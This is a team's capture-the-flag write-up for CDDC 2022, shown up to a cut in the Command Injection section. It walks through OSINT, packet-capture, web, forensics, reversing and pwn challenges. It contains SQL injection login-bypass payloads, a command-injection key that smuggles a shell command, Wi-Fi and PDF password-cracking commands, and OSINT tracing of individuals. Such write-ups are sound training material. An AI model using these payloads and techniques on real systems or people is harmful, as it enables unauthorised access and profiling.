# [CDDC22](https://ctf-cddc2022.com/)

<img align="left" width="200" height="200" src="https://user-images.githubusercontent.com/68913871/175209893-3f3f88bd-2a52-421c-8c0e-426c5cafd549.png">

&nbsp; 48 hours Jeopardy-Style  
&nbsp; Tue, 21 June 2022, 10:00 SGT — Thur, 23 June 2022, 10:00 SGT

&nbsp; **Team Name:** *FoundSatis*  
&nbsp; **Team Member(s):**  
&nbsp; 1. *Andre*  
&nbsp; 2. *Elvis*  
&nbsp; 3. *Kai Sheng*  
&nbsp; 4. *Benjamin*  

We came **25th** in University category and **31st** in Open Category. [CDDC 2022 - Final Scoreboard.xlsx](https://github.com/Rookie441/CTF/files/8966133/CDDC.2022.-.Final.Scoreboard.xlsx)
# Challenges

| [*Osint*](#osint) | [*Network*](#network) | [*Web*](#web) | [*Forensics*](#forensics) | [*Reversing*](#reversing) | [*Pwn*](#pwn) | [*Misc*](#misc) | [*Crypto*](#crypto) |
| --- | --- | --- | --- | --- | --- | --- | --- |
| [The place](#the-place) | [Simple Shark](#simple-shark) | [baby web](#baby-web) | [Unknown file](#unknown-file) | [ARM](#arm) | [Command Injection](#command-injection) | [go n c](#go-n-c) | [Vigenere](#vigenere) |
| [Darknet](#darknet) | [Some Sharks](#some-sharks) | [SQLogin](#sqlogin) | [Unknown file2](#unknown-file2) | [MIPS](#mips) | [Simple BOF](#simple-bof) | [Invisible morse](#invisible-morse) | [Diffie-Hellman](#diffie-hellman) |
| [Whats your name](#whats-your-name) | [ARP Spoofing](#arp-spoofing) | [Little star](#little-star) | [Stegano](#stegano) | | [Uninitialized](#uninitialized) | [Copy n Paste](#copy-n-paste) |
| [flying squirrel](#flying-squirrel) | [WEP](#wep) | [js easy](#js-easy) | [Dump Jump](#dump-jump) | | | [PPS](#pps) |
| [Secret Message](#secret-message) | [WiFi](#wifi) | | | | | [Hash Attack](#hash-attack) |
| [photographer](#photographer) | [SNMP](#snmp) | | | | | [Crack the password](#crack-the-password) |

# Osint

### The place

![image](https://user-images.githubusercontent.com/68913871/175220086-5b0ad9e1-5357-46ce-ae1d-85cc05619729.png)

> The picture shows a CocaCola restaurant. Note that it is partially censored by the black circle but we can still tell that there is a bumper car on the floor. We can then zoom in to the part which gives us the most information and search the image on google.

<img width="200" height="200" src="https://user-images.githubusercontent.com/68913871/175220330-ff6a439d-2c08-43f5-a469-c6d295573b43.PNG">

> After some scrolling, we see the same CocaCola signboard with the black background. It points us to PLANET 16.

![image](https://user-images.githubusercontent.com/68913871/175221071-45cfdb51-ef15-40fb-b465-2b40722d76de.png)

> Search PLANET 16 on google to confirm that there is the bumper car.

![image](https://user-images.githubusercontent.com/68913871/175221329-1870ea87-cdde-4ace-b3fa-3c31630e2daa.png)

> We then obtain the phone number as the flag.

![image](https://user-images.githubusercontent.com/68913871/175221470-f6066d77-a9bd-43a0-ad90-01107918b4af.png)

`CDDC22{+4928418896097}` [Go to Top](#CDDC22) ⬆️

### Darknet

![image](https://user-images.githubusercontent.com/68913871/175221723-eb67241d-3b80-4d12-bb6b-87257a3e4106.png)

> Navigate to the [link provided](http://jrtftx52s2gfjr4pz3nyk6ph55bz5of6ahhy2rmxwzxqv46wbyeatxid.onion). You will need a [Tor Browser](https://www.torproject.org/download/) for onion links.

![image](https://user-images.githubusercontent.com/68913871/175221961-bd4931af-a141-4113-a951-9a45fcc487fb.png)

> There is a zip file to download but it is protected by a password which is the python code `myname.replace(" ","_").lower()`. This suggests that we first need to find the name of the drug king.

> We can use Yandex reverse image finder on the profile picture which gets us [here](https://yandex.com/images/search?cbir_id=1645139%2Fk0GXgZHLkPYDDY26CtcI6g7203&pos=0&rpt=imageview&img_url=https%3A%2F%2Fpbs.twimg.com%2Fmedia%2FFRmf6LHagAAXJws%3Fformat%3Djpg%26name%3Dlarge&cbir_page=similar&url=https%3A%2F%2Favatars.mds.yandex.net%2Fget-images-cbir%2F1645139%2Fk0GXgZHLkPYDDY26CtcI6g7203%2Forig&rlt_url=https%3A%2F%2Fluxfm.kz%2Fwp-content%2Fuploads%2F2021%2F05%2Fsyr-narkotorgovecz.jpg&ogl_url=https%3A%2F%2Fpbs.twimg.com%2Fmedia%2FFRmf6LHagAAXJws%3Fformat%3Djpg%26name%3Dlarge). Then, we can click on one of the [links](https://www.newsweek.com/man-arrested-drug-dealing-after-posting-photo-block-cheese-1594357) which is a news article titled `Man Arrested for Drug Dealing After Posting Photo With Block of Cheese`. Inside the article is his name `Carl Stewart`

> Now we just need to apply the password format using the python code to give us `carl_stewart` as our password. We can now unzip the protected file to get our flag.

`CDDC22{Be_c@r3fu1_wh3n_p0st1ng_p1ctures_0n_th@_1nt3rn3t}` [Go to Top](#CDDC22) ⬆️

### Whats your name

![image](https://user-images.githubusercontent.com/68913871/175222899-176ea9de-74bd-4143-9a5d-ea964d3fdb1d.png)

> Use google dorking commands to get more specific results. `site:linkedin.com "fake photo company"`

![image](https://user-images.githubusercontent.com/68913871/175223099-a563607a-9255-42b6-8cf7-2c5d92008e10.png)

`CDDC22{wolfgodafrid}` [Go to Top](#CDDC22) ⬆️

### flying squirrel

![image](https://user-images.githubusercontent.com/68913871/175223298-a4dd4eb5-903d-48ef-954b-267a4002df09.png)

> We are given a PGP key file:

```
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: GnuPG v1

mQENBF6EQ8oBCACpJEemTaEh/Z1bA8upQyJQv6tEsPjLH443EAMozuXZ3tI+hR45
oLWyBg4gfp+uKVG9xaa1Z36/b5o+r04a6JpNEHqgDSJYZ8kaK+zopHFqiln1z9Ie
70jOxIg6Im91T6EapIgAC1JH89W4ksyUeIL0RSDOo5gFBVbWIErY9XOm+dgKbfn6
K943DJnGYVnX7XJucmoONPcsxX0FUHRPQF/fiZYmgvc170oVUYWVacEJMm78rIE+
oszhsObapbIoBfz3mK1Xvh7lmFf+AEMhKcB4r3NedpZtcmYRAA0HpUTtHdnecdZf
u3Z27lFXsfvbt4Bq7FdJ5VVM38pRHsBlYEsFABEBAAG0Gndob3J1IDxuYWxkYXJh
bWdpQGtleS5rZXk+iQFOBBMBCAA4FiEEf7BZPV+0zqrKEeheKmK6ZiWZSJQFAl6E
Q8oCGwMFCwkIBwIGFQoJCAsCBBYCAwECHgECF4AACgkQKmK6ZiWZSJQxXAgAgbE6
eZOhMklUIiXBXswHMKd4QdIRxuDc4G7POfhAeYzLE9B3Rqrf2nLYzuAG46l01aSW
lWq/KKtLbr6qQz9wbg5caZpVrWRHz5H3v38JYf87cKGIj1HNAUAonfawnZjqq1OY
+0zLiLp5W0/BekIRSheqDXELncWfyJYFSRUDBFTf/zlsEYPSyigb+u4/tsfZZO9x
olJsku2ahbKMWaeS1+NHJaKnoQF0YF4yGnYl0Bl8wa5UQEBIuaMhwVIxenholTl+
cvrdK0a8va0Q/wJ3rz/7UcCwApm13wBm5R1gqGn76X2ZuD6B3hYfqlb16ayI92xV
R2RIQ9S8hbCfVq6VsLkBDQRehEPKAQgAzh+6kZo3zCNcIKnBH/vrUd+gRysBJUvO
ZNL3EKsNSo2Krtw89dZEd8X9nmYb19B++T/v9yzoaniVG3MjqDNaLKH8U5jVMzsb
qrSHDyfnycy2G7zWxrE5wPuAlcJOMODuulnx2jc/ZkVn+lVWrs5E9qwJ5NVsc/pD
4b3OT+dJoRFpsp66yuq1841eqSInqploss23XoWyik8UKJRZm57eguHjYynnSJUV
w0FVqcWV54lIvotqkq4XLiQpdre+mpe5jL6PHIlwaxkEPD3fERdc5ZAAQqfTuhiU
p5LPAv40KrnRAaBE+tWw7i7EAb5qpLsGNFSQ4H5rPikWp/h8gEcAnwARAQABiQE2
BBgBCAAgFiEEf7BZPV+0zqrKEeheKmK6ZiWZSJQFAl6EQ8oCGwwACgkQKmK6ZiWZ
SJT4Dgf/UZE3N2Ve9ql6kyAa4qaRmml4b2n+mmVBXkUunF2isMj0CsSFcf6C6uqG
eZX6taIASaex/fP5uszidwjfW6nnDil0Zir0GtQlCcqhF1da6hDdwl6YAMvtAPte
Y9IZAJ0+krRVrI0T5TuBkWxtiBsMZEoRXcUDKZrjUYAGtMWwRYFehc8Qq5eAxUqP
BzrXUZJOyEvPny18EYbAk4fy4az7GDW3IRO7Xz4FOsdvKyXHis5ufBsh6Hbce1Nu
i0Xn1jDxZHVMxLQvsqUnRnxUebqr/ct/2H2Znz8OhU0wc9EUMqvdAkZOXeDjWVQ6
DghDf4eRAEVzBzGkLrhGpjPLqnaSig==
=BxZi
-----END PGP PUBLIC KEY BLOCK-----
```

> We can obtain the email using the `gpg` command in linux. However, make sure we delete the line `Version: GnuPG v1` so that our block starts with the correct data.

![image](https://user-images.githubusercontent.com/68913871/175224197-1c00f3fe-5c82-4ab5-b1d6-74e3f1231e19.png)

`CDDC22{naldaramgi@key.key}` [Go to Top](#CDDC22) ⬆️

### Secret Message

![image](https://user-images.githubusercontent.com/68913871/175224293-d134d804-96eb-47fc-a341-00e3f2a3dfbf.png)

> The first sentence in quotes points us to [Internet Archive](https://archive.org/search.php). We can then type in the keywords `Cornell University` and `herries` and look out for the word `paradox`

![image](https://user-images.githubusercontent.com/68913871/175224537-0153c152-181b-4e3c-8d52-03e5f5fae75f.png)

> The flag can be found under Reviews

![image](https://user-images.githubusercontent.com/68913871/175224627-1212e2ce-cb2e-4ef6-95b4-329a25b1f2a8.png)

`CDDC22{s3cretMe$$age}` [Go to Top](#CDDC22) ⬆️

### photographer

![image](https://user-images.githubusercontent.com/68913871/175224738-c940bda4-3ae2-4359-9a05-769c3d4e72c8.png)

> Navigate to the link and read the comments section in the blog post.

![image](https://user-images.githubusercontent.com/68913871/175226224-0ff86ffe-af87-4e0c-802a-68b5ba4b1ed7.png)

> We discovered that the target has been fired from his company recently and is now doing freelance photography. The target also exposed his email account. We can then use an online osint tool [Epieos](https://epieos.com/) to gather information about our target.

![image](https://user-images.githubusercontent.com/68913871/175225550-6c544016-745e-4006-b3eb-0eec301b1128.png)

> We can see that his name is `unanimous209` and he has a registered twitter account. So, we can navigate to https://twitter.com/unanimous209

![image](https://user-images.githubusercontent.com/68913871/175225776-719cdccf-d4a1-4f84-a6bd-7409b7ca2ed3.png)

> We can tell that this is the correct person because he has been dismissed from his photo company as mentioned in his blogpost. Under his tweets, we see a secret. If we change the `x` to `t`, we get https://bit.ly/3rVJKns which is a password protected zip file.

> We still need to find the password. After some trial and error, we found our that he has a Youtube account with the name `rayet0913`.

![image](https://user-images.githubusercontent.com/68913871/175226853-62d20c93-1fc2-48dd-ae24-7a55e379ab71.png)

> Inside his channel is a [video](https://www.youtube.com/watch?v=EBhxnK50Gfs&ab_channel=rayet0913) and upon close inspection, we can see the zip password in his command line history which is  `Wo1f Ray3t st4r`.

> We can then open the password protected zip file to get our flag.

`CDDC22{LIVE_FOR_MY_MONEY}` [Go to Top](#CDDC22) ⬆️

## Network

### Simple Shark

![image](https://user-images.githubusercontent.com/68913871/175229160-ade40bfb-0cd2-45f3-9140-4d5f50725945.png)

> Open the .pcap file using wireshark and search for String `CDDC22` in the Packet bytes.

![image](https://user-images.githubusercontent.com/68913871/175229122-1d269f61-ca2b-4b8d-97d5-1847e0c14ef5.png)

`CDDC22{The_s6@rK_H@D_@_F1@99999!!!}` [Go to Top](#CDDC22) ⬆️

### Some Sharks

![image](https://user-images.githubusercontent.com/68913871/175229414-63454744-d2ec-400b-a19f-b82808e7660b.png)

> Analyze the .pcap file using wireshark. Since we know that we are required to log in to the website, we can apply the http filter.

![image](https://user-images.githubusercontent.com/68913871/175229884-d751f950-0001-41b3-af09-0c2190b29f84.png)

> We then analyze the HTTP requests URI to see if there is any non-public website created for this challenge

![image](https://user-images.githubusercontent.com/68913871/175230307-693f8248-c847-47ae-b1e8-a664207c4e86.png)

> After a while we found this ip address and port number which looks suspicious http://13.250.249.51:5054/. We can then further narrow our search using the filter `ip.addr==13.250.249.51`

![image](https://user-images.githubusercontent.com/68913871/175230679-47fd06b0-f72f-47fb-8d02-3b03ef1b035d.png)

> We can see communication between the Source ip `10.10.10.118` and Destination ip `13.250.249.51`. The Source is sending GET requests to the destination with Authorization Credentials: `test2:test2` as seen in the above screenshot. However the server replied with `401 Unauthorized` because the credentials provided were incorrect.

> Thus, we need to scroll down the packets to see the request which was successful.

![image](https://user-images.githubusercontent.com/68913871/175231092-1d648a2e-708e-499b-b4f9-6698c93b67b4.png)

> Since the server responded with code `200 OK`, it means that the credentials `admin:aklfj!JRFIASLZJFop1i02FJ102` is valid. We can then proceed to login with this credentials to get our flag.

![image](https://user-images.githubusercontent.com/68913871/175251784-5875df17-c8a8-4582-9130-bbdeaae04a66.png)

![image](https://user-images.githubusercontent.com/68913871/175252136-44d1d624-fb5a-40cc-9077-b1f71dc42e37.png)

`CDDC22{S0me_Sh4rk5_4r3_k1nD_ISNt_1t?}` [Go to Top](#CDDC22) ⬆️

### ARP Spoofing

![image](https://user-images.githubusercontent.com/68913871/175233048-391b9c4c-2295-4895-9a8c-310597039da0.png)

> Analyze the .pcap file using wireshark. Under ARP protocol, we can see duplicate use of ip address in an attempt to spoof. The mac address of `192.168.0.100` is shown

![image](https://user-images.githubusercontent.com/68913871/175233689-fcc593e0-0bff-4c68-ab3c-a5739b1c1663.png)

`CDDC22{30:24:a9:81:04:90}` [Go to Top](#CDDC22) ⬆️

### WEP

![image](https://user-images.githubusercontent.com/68913871/175234095-ad91d162-e96c-4236-aed6-e9f2cd854fed.png)

> We can use `aircrack-ng` in kali linux to crack the password of this .cap file by supplying the `dictionary.txt` wordlist provided.

```
aircrack-ng wepcrack.cap -w dictionary.txt
```

![image](https://user-images.githubusercontent.com/68913871/175234755-37c92266-3940-4886-a12d-11af25fc0937.png)

`CDDC22{Dr0ne_WEP_Cr@cking!!!}` [Go to Top](#CDDC22) ⬆️

### WiFi

![image](https://user-images.githubusercontent.com/68913871/175235072-ab667e73-5c72-41cd-be89-a4406b1f3d64.png)

> This is a similar challenge to WEP. However, this time we do not have a wordlist. We do however have information about the password.

```
Length: 8
Type: Digits (0-9)
Format: 2XXXX2XX
```

> We can then create a custom wordlist using `crunch`. Read [this link](https://www.hackingloops.com/creating-custom-worldlist-using-crunch-kali-linux/) to learn more. In summary:

```
crunch <min> <max> <characterset> -t <pattern> -o <output filename>

min= The minimum password length.
max= The maximum password length.
characterset= The character set to be used in generating the passwords.
-t <pattern>= The specified pattern of the generated passwords. For instance, if you knew that the target’s birthday was 0728 (July 28th) and you suspected they used their birthday in their password (people often do), you could generate a password list that ended with 0728 by giving crunch the pattern @@@@@@@0728. This word generate passwords up to 11 characters (7 variable and 4 fixed) long that all ended with 0728.
-o <outputfile>= This is the file you want your wordlist written to.
```

> With the information about our password, we can then run the following command to generate our custom wordlist.

```
crunch 8 8 0123456789 -t 2@@@@2@@ -o customwordlist
```

> Now, use `aircrack-ng` and supply the wordlist as we did before in the WEP challenge.

![image](https://user-images.githubusercontent.com/68913871/175237117-9c15d888-d5e2-4624-9298-cea6ee73010e.png)

`CDDC22{23501268}` [Go to Top](#CDDC22) ⬆️

### SNMP

![image](https://user-images.githubusercontent.com/68913871/175237231-306613ec-dc76-4251-8cc6-114d07713324.png)

> This challenge was done by Elvis. This is his writeup:

> We are given a pcapng file. Open it using Wireshark. The aim is to obtain details about a printer inside the pcapng file, and use the information to craft a SNMP request to send to the printer.

> The challenge description tells us to look for the oid value: `iso.3.6.1.2.1.1.1.0` We do it in the following way:

![image](https://user-images.githubusercontent.com/68913871/175345859-75817c9c-7f14-4344-8b59-0b53b6225a3d.png)

```
Step 1: Click the Search Button
Step 2: Select ‘String’ in the dropdown to indicate that you want to search for a string.
Step 3: Select ‘Packet Details’ in the left dropdown to indicate that you want to restrict the search area to only cover the details of the packets.
Step 4: Enter the string that you want to search for inside the textbox.
Step 5: Click the “Find” button to begin searching.
```

> The search will show that Packets 3 and 4 contains the oid value that we are searching for. We examine Packet 3 more closely:

![image](https://user-images.githubusercontent.com/68913871/175346019-8e56a8d8-2619-4a76-b7f2-c2268a634998.png)

> From the information in this packet, we can see that the SNMP version used is `version-1` and the community string is `public1`.

> Next, we want to start crafting the command that sends the SNMP request to the printer. We look at the `snmpget` command’s help message:

![image](https://user-images.githubusercontent.com/68913871/175346196-185692b4-1fc0-424f-a1f7-ddc483404fdb.png)

> We can use the `-v` flag to specify the SNMP version to use and the `-c` flag to specify the community string.

```
snmpget -v1 -c public1 13.215.173.140 iso.3.6.1.2.1.1.1.0
```

> The SNMP request gets sent out successfully and we see that the flag is attached behind the response.

`CDDC22{L34king_SNMP_C0mmunity_$}`

## Web

### baby web

![image](https://user-images.githubusercontent.com/68913871/175237309-2edab448-bcff-4085-a444-6aa1ce6bf17d.png)

> Inspect elements to obtain the flag.

![image](https://user-images.githubusercontent.com/68913871/175237336-48946220-89b4-4d86-95f3-950d5f4df13e.png)

`CDDC22{H3lL0_Spac3_tr4v3l3r5}` [Go to Top](#CDDC22) ⬆️

### SQLogin

![image](https://user-images.githubusercontent.com/68913871/175237538-0555ebd2-1614-4ace-a288-ce1c76e326cc.png)

> We try the generic [SQL injection authentication bypass](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/) payload `' or 1=1--` in the username field but the server responded with `Username is too long`

![image](https://user-images.githubusercontent.com/68913871/175237574-e01ac41b-fb21-48fd-8140-095ff5bf5218.png)

> Try a shorter SQL injection such as `'or 1;` to get the flag.

![image](https://user-images.githubusercontent.com/68913871/175237598-e9be06d7-933b-40af-a930-c97a1860ab65.png)

`CDDC22{Th1s_i5_51mp1e_SQL_inj3ct10n}` [Go to Top](#CDDC22) ⬆️

### Little star

![image](https://user-images.githubusercontent.com/68913871/175238452-3689ee2a-ad1b-49cb-a295-3b3cbe970817.png)

> View source code, under the comments we can see `twinkle_star -> little_star -> flag`

![image](https://user-images.githubusercontent.com/68913871/175238470-884673fe-476a-4202-aec2-8e658092d8db.png)

> Navigate to cookies, we can see the cookie name `star` having the value `twinkle_star`.

![image](https://user-images.githubusercontent.com/68913871/175238490-e6d504ab-a48c-4a10-b72d-5ee2b24953b5.png)

> We can edit the cookie value to `flag` to get the flag.

![image](https://user-images.githubusercontent.com/68913871/175238504-5635c14d-cd85-4640-b0d1-1d92bded4864.png)

`CDDC22{B4by_W3b_H4cking_3asy++}` [Go to Top](#CDDC22) ⬆️

### js easy

![image](https://user-images.githubusercontent.com/68913871/175238521-a118e742-8195-4364-b4ba-42be2d1a036a.png)

> Inspect elements to see the code embedded in script tags

![image](https://user-images.githubusercontent.com/68913871/175239341-ce68270a-f56c-41cd-9fba-8ee966e6c6e2.png)

> In the console, we can see that variable g is not defined.

![image](https://user-images.githubusercontent.com/68913871/175239552-d21c1762-8cc9-434a-819e-db420996dc5f.png)

> Thus, we need to define variable g using `var g='';` at the beginning of the code. We can edit the .html file using any text editor.

![image](https://user-images.githubusercontent.com/68913871/175241029-61f21d7c-669b-4129-960a-6195c6fb5912.png)

![image](https://user-images.githubusercontent.com/68913871/175241059-d7f28b69-5854-44ee-a152-2c2d1fdc04cf.png)

`CDDC22{h4haHaH4_it_Is_to0_EASY_R1ght?}` [Go to Top](#CDDC22) ⬆️

## Forensics

### Unknown file

![image](https://user-images.githubusercontent.com/68913871/175241332-99bb180c-7435-4530-a3d7-3518d3b61d49.png)

> We are given a text file with a long chunk of hexadecimal values. The first line looks like this:

```
89504E470D0A1A0A0000000D4948445200000370000002BC0806000000AEB75DAC00000C69694343504943432050726F66696C65000048899557075853C9169E5B929090D0021190127A13447A9112428B2
```

> We can immediately see the `89 50 4E 47 0D 0A 1A 0A` is the unique [file signature](https://en.wikipedia.org/wiki/List_of_file_signatures) for a png file.

> We can then use CyberChef `From Hex` and `Render Image` to see the png file

![image](https://user-images.githubusercontent.com/68913871/175242158-1013c398-97b0-4fd6-b1f7-6bd5354b2f0e.png)

> However, we do not get the flag. It seems that the png file might have been corrupted. More particularly, the height of the png file is smaller than expected, as hinted by the downward arrow stating `This is Flag!!!!!!!!!`

> We can analyze the hexadecimal values of our png file by opening in a hex editor:

![image](https://user-images.githubusercontent.com/68913871/175243368-12568269-5bd5-42cf-a2ea-9442cf6ecd82.png)

```
89 50 4e 47 0d 0a 1a 0a: File signature of png.
00 00 00 0d: IHDR length.
49 48 44 52: Chunk type, which in this case specifies IHDR.
00 00 03 70: Width
00 00 02 bc: Height
08: Bit depth.
06: Colour type.
00: Compression type.
00: Filter type.
00: Interval type.
ae b7 5d ac: CRC checksum.
```

> We can then manually change the height to something larger such as `03 bc` to get the flag

![image](https://user-images.githubusercontent.com/68913871/175244015-32168bf7-2fbe-4bb5-ac20-dfc8c63912c4.png)

`CDDC22{S6oW_me_y0u're_4he_8est}` [Go to Top](#CDDC22) ⬆️

### Unknown file2

![image](https://user-images.githubusercontent.com/68913871/175244191-c08e2a2c-ec27-462d-b1c2-204c632b1f77.png)

> Since there is no specific file type, we can use the linux `file` command to determine what type of file it is.

![image](https://user-images.githubusercontent.com/68913871/175244335-ebc32207-8986-4f70-a13b-f0add602d965.png)

> If we were to simply unzip the file, we get 4 files and a strange error message.

![image](https://user-images.githubusercontent.com/68913871/175246498-72810dce-172d-4b40-a530-a3e0c48bb9c1.png)

> It states that file #5 is not found. Maybe there are more embedded files? Run the `binwalk` command to see.

![image](https://user-images.githubusercontent.com/68913871/175246856-7d173661-0131-4021-adf4-aa1fbd71988d.png)

> Indeed, we see 2 additional files `Flag.pdf` and `dictionary.pdf`. We can then open the unknownfile in a hexeditor and search for `Flag.pdf`

![image](https://user-images.githubusercontent.com/68913871/175247320-a5e612ce-0097-4e8f-bccd-61bc422907eb.png)

> Delete the hex-values before the PK header of the `Flag.pdf`. The PK header (`50 4B 03 04`) is a unique file signature for zip files. Then save and open the file using 7zip.

![image](https://user-images.githubusercontent.com/68913871/175247820-91e34fac-131d-4914-94cd-db5c36472ce0.png)

> We now have the 2 files `Flag.pdf` and `dictionary.pdf`. We then proceed to open `Flag.pdf` but it is protected by a password. The contents of `dictionary.pdf` is the following link https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt

> This suggests that we have to bruteforce the password using a dictionary attack. We first need to convert the pdf into a hash using `pdf2john`. Then, we can run john with our supplied wordlist to get our password:

![image](https://user-images.githubusercontent.com/68913871/175249141-07c8daf6-a8de-4758-8b1c-ee7b2cf164e3.png)

> Enter `copacaban` as the password to unlock the pdf file. As the challenge description says, it is written in white. So we need to select all (Ctrl+A) to see our flag.

![image](https://user-images.githubusercontent.com/68913871/175249390-f4d639b9-ab87-4a73-9d1e-b79e525230be.png)

`CDDC22{T6is_is_4he_9re@tes4_D@y_0f_my_1ife!}` [Go to Top](#CDDC22) ⬆️

### Stegano

![image](https://user-images.githubusercontent.com/68913871/175249636-8274133b-18e3-4ad7-9844-80df74a8d4d5.png)

> We are given 2 similar images named `hidden.png` and `org.png`. We can compare the differences using a [Steganographic Comparator](https://futureboy.us/stegano/compinput.html). This is what we get:

![image](https://user-images.githubusercontent.com/68913871/175250261-07b08688-6f54-4477-b652-9d7e4cd5898c.png)

> There are winning numbers, login credentials: `Jason78` `3nD_g4m3!` and a QR code. We begin first by scanning the QR code but it did not work. Thus, I decided to do the long way which was to manually craft the QR code using [QRazyBox](https://merricx.github.io/qrazybox/)

![image](https://user-images.githubusercontent.com/68913871/175251193-fd33aaac-536f-4d4b-b16b-8b833d37fcb2.PNG)

> After converting to black and white, we can now scan the QR code which brings us to http://13.250.249.51:19282/login. We can use the credentials obtained earlier to login and we are directed to this page:

![image](https://user-images.githubusercontent.com/68913871/175254509-f2f7b5d0-6f68-4b5f-8e10-d94902cc3e08.png)

> Now, we just have to fill in the blanks and verify to get our flag.

[Go to Top](#CDDC22) ⬆️

### Dump Jump

![image](https://user-images.githubusercontent.com/68913871/175255207-c3f128ab-f6a9-4eee-98f2-137015bf5dcd.png)

> We are given a .vhd file which stands for virtual hard disk. We can analyze its contents using `autopsy`.

![image](https://user-images.githubusercontent.com/68913871/175255592-420b7369-1919-400b-934f-2dd367a3efee.png)

> Create a new case, add a host, then add the disk image.

![image](https://user-images.githubusercontent.com/68913871/175255988-d24f915b-918e-4af9-9bff-1fcc0be86506.png)

> Click on the C drive and then press analyze. Under the `File Analysis` tab, we scroll down to see a strange filename made up of hexadecimal digits.

![image](https://user-images.githubusercontent.com/68913871/175256276-c45acfc6-e23c-42ad-bf18-36da3a89cef8.png)

> Upon viewing the contents in ASCII, we can see from the header that it is a pdf file. We can press on `Export` and then open the file to view the flag.

![image](https://user-images.githubusercontent.com/68913871/175256823-cc32f9f3-c1fc-450b-a372-9dcfecafa31b.png)

`CDDC22{i_9ot_y0ur_6@cK_Ch0sen_0nE}` [Go to Top](#CDDC22) ⬆️

## Reversing

### ARM

![image](https://user-images.githubusercontent.com/68913871/175257268-f91f8e75-adb3-4062-8157-9ba6d101ebdb.png)

> We are given an ELf binary which can be analyze using a decompiler like [Ghidra](https://ghidra-sre.org/)

```C

void func(void)

{
  undefined *__s2;
  size_t __n;
  int iVar1;
  char acStack144 [132];

  printf("Login : ");
  fflush(stdout);
  read(0,acStack144,0x14);
  __s2 = user;
  __n = strlen(user);
  iVar1 = strncmp(acStack144,__s2,__n);
  if (iVar1 != 0) {
    puts("\n[!] Wrong ID!");
    bye();
  }
  printf("Password : ");
  fflush(stdout);
  read(0,acStack144,0x14);
  iVar1 = strncmp(acStack144,"s3cr3t_k3y",10);
  if (iVar1 == 0) {
    spawn_shell();
  }
  else {
    puts("[!] Wrong password!");
  }
  bye();
  return;
}
```

> From the decompiled code, we can see that the program prompts the user for a Login ID, which is stored to a character array `acStack144` and then string compared to `__s2` which is `user`. If the comparison matches, the program will the proceed to prompt for a password, which is compared against `s3cr3t_k3y`. If this is also matches, a shell will be spawn which allows us to retrieve the flag.

> Thus, the missing information we need is the variable `user`. This can be found by double clicking `user` and navigate to its data in hex in the ghidra listing interface.

![image](https://user-images.githubusercontent.com/68913871/175259323-41aacd45-9215-48c3-aee2-ff1f9d1404a2.png)

> We can convert the hex values `72 30 30 74` to get `r00t` as our user. Now, we just need to enter the required information on the remote server and cat the flag file.

![image](https://user-images.githubusercontent.com/68913871/175259619-6ba09e70-0c04-4831-9637-76c257157fb3.png)

`CDDC22{R3versing_4rm_fun_AND_G00d !! }` [Go to Top](#CDDC22) ⬆️

### MIPS

![image](https://user-images.githubusercontent.com/68913871/175259874-9730bd43-cf59-47ab-a6f9-6860faf850ed.png)

> Similar to the ARM challenge, we decompile the ELF file using [Ghidra](https://ghidra-sre.org/)

```C
void func(void)

{
  size_t sVar1;
  uint local_50;
  byte abStack76 [64];
  int local_c;

  local_c = __stack_chk_guard;
  memset(abStack76,0,0x40);
  local_50 = 0;
  while( true ) {
    sVar1 = strlen(flag);
    if (sVar1 <= local_50) break;
    abStack76[local_50] = flag[local_50] ^ 6;
    local_50 = local_50 + 1;
  }
  printf("The flag is %s\n",abStack76);
  if (local_c != __stack_chk_guard) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

> From the decompiled code, we can see that the while loop is doing some decryption to the flag and the result is stored to `abStack76`. The counter is `local_50`, it is initialized to 0 and incremented by 1 after every iteration. Once the number of iterations equals to the length of the flag, the loop breaks and the flag is printed.

> We can obtain the encrypted version of the flag by double clicking on `flag` and navigate to its data in hex in the ghidra listing interface.

![image](https://user-images.githubusercontent.com/68913871/175261252-fe88c7d9-7069-48dc-bf70-ce4bc592ebf8.png)

> We can then convert the hex values to give us `EBBE44}7YJip5YAn7bt2Yk7vuYtcp5tuohax{`. Thereafter, we can write a simple python script to do the decryption. Note that since the operation `^` is XOR, we must first convert the characters to decimal using `ord()` and then use `chr()` to convert it back to char.

```python
encrypted = "EBBE44}7YJip5YAn7bt2Yk7vuYtcp5tuohax{"
charList = []
for i in encrypted:
    charList.append(ord(i))

counter = 0

while True:
    length = len(encrypted)
    if (length <= counter):
        break
    charList[counter] = charList[counter] ^ 6
    counter+=1

for i in charList:
    print(chr(i), end="")
```

`CDDC22{1_Lov3_Gh1dr4_m1ps_rev3rsing~}` [Go to Top](#CDDC22) ⬆️

## Pwn

### Command Injection

![image](https://user-images.githubusercontent.com/68913871/175262643-a11ffa90-3b19-45b6-bc4a-d578da3b13eb.png)

> Analyze the ELF binary using [Ghidra](https://ghidra-sre.org/) to get the following decompiled code

```C
void func(void)

{
  int iVar1;
  long in_FS_OFFSET;
  char local_198 [128];
  char local_118 [264];
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Key : ");
  fflush(stdout);
  read(0,local_198,0xe);
  iVar1 = strncmp(local_198,"Pa$$WoRD1@",10);
  if (iVar1 == 0) {
    sprintf(local_118,"echo %s",local_198);
    system(local_118);
  }
  else {
    puts("Wrong key!");
  }
  sleep(1);
  puts("Good bye.");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

> We can observe that the program prompts the user for a key and stores it in `local_198`. The first 10 characters in `local_198` is then string compared to `Pa$$WoRD1@` and if it is a match, it will return 0 and we will be able to enter the system() which is what we want.

> Note that in the read() function, we are allowed to read up to `0xe` which is `14` in decimal. Since our first 10 characters must match `Pa$$WoRD1@`, this gives us 4 characters to work with for our command injection. We can test this out. For `system("ls")`, we can enter our key as `Pa$$WoRD1@; ls`

![image](https://user-images.githubusercontent.com/68913871/175264927-bfab022c-5807-496c-9b7c-3ac9527365e7.png)

> We see that it worked on both local and remote, as it listed the files in the current directory. We now need to run `system("cat flag")`. However, this is not possible because the read function can only read up till 14 characters

```
Pa$$WoRD1@; cat flag -->  Pa$$WoRD1@; ca
```

> `system("ca")` will be an invalid command.

